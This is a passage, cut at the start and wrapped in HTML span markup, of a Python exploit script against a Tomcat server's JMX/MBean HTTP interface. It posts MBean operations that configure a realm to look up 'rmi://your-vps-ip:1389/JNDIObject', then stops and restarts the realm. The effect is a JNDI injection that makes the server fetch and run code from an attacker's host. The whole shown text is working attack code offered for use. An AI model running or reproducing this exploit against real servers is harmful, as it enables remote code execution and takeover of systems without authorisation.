&quot;rmi://your-vps-ip:1389/JNDIObject&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">stop = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;EXEC&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;operation&quot;: &quot;stop&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;arguments&quot;: []</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">start = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;EXEC&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;operation&quot;: &quot;start&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;arguments&quot;: []</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">flow = [create_realm, wirte_factory, write_url, stop, start]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">for i in flow:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&#39;%s MBean %s: %s ...&#39; % (i[&#39;type&#39;].title(), i[&#39;mbean&#39;], i.get(&#39;operation&#39;, i.get(&#39;attribute&#39;))))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = requests.post(url, json=i)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r.json()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(r.status_code)</span></p></body>
</html>
